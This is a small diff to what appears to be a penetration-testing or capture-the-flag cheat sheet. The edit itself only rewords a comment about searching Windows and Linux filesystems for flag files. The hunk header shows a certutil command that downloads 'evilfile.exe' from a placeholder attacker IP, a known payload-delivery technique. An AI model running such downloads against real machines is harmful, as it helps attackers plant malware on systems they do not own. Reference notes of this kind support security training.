@@ -72,7 +72,8 @@ certutil -urlcache -f http://<ATTACKER IP>/evilfile.exe evil.exe
 
 # finding loot - dir - search windows filesystem for file
 dir flag.txt /S /B
-# and in powershell...
+
+# finding loot - powershell - search windows filesystem for file
 Get-Childitem –Path C:\ -Include *FLAG* -Exclude *.JPG,*.MP3,*.TMP -File -Recurse -ErrorAction SilentlyContinue
 
 # finding loot - find - search linux filesystem for file
